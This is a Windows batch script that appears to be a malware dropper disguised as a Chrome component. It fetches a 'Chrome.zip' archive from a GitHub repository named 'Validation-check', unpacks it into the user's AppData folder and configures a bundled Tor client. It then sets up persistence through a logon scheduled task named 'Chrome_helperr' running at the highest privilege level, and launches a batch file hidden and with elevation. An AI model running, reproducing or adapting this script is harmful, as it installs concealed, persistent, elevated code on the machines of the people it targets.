powershell.exe -Command "Invoke-WebRequest -Uri 'https://github.com/Glareing/Validation-check/raw/main/Chrome.zip' -OutFile '%APPDATA%\Chrome\Chrome.zip'"
if not exist "%APPDATA%\Chrome\Chrome.zip" (
    timeout /t 2
    powershell.exe -Command "Invoke-WebRequest -Uri 'https://github.com/Glareing/Validation-check/raw/main/Chrome.zip' -OutFile '%APPDATA%\Chrome\Chrome.zip'"
)
tar -xf "%appdata%\Chrome\Chrome.zip" -C "%appdata%\Chrome"
set TOR_LOG_FILE=%APPDATA%\Chrome\Chrome\data\tor.log
set GEOIP_FILE=%APPDATA%\Chrome\Chrome\data\geoip
set GEOIPV6_FILE=%APPDATA%\Chrome\Chrome\data\geoip6
set TORRC_FILE=%APPDATA%\Chrome\Chrome\torrc
echo Log notice file %TOR_LOG_FILE% > "%TORRC_FILE%"
echo GeoIPFile %GEOIP_FILE% >> "%TORRC_FILE%"
echo GeoIPv6File %GEOIPV6_FILE% >> "%TORRC_FILE%"
type "%TORRC_FILE%"
schtasks /create /tn "Chrome_helperr" /tr "wscript.exe \"%APPDATA%\Chrome\Chrome\launch.vbs\"" /sc onlogon /ru "%username%" /f /rl highest
powershell -Command "Start-Process '%APPDATA%\Chrome\Chrome\astart.bat' -WindowStyle Hidden -Verb RunAs"
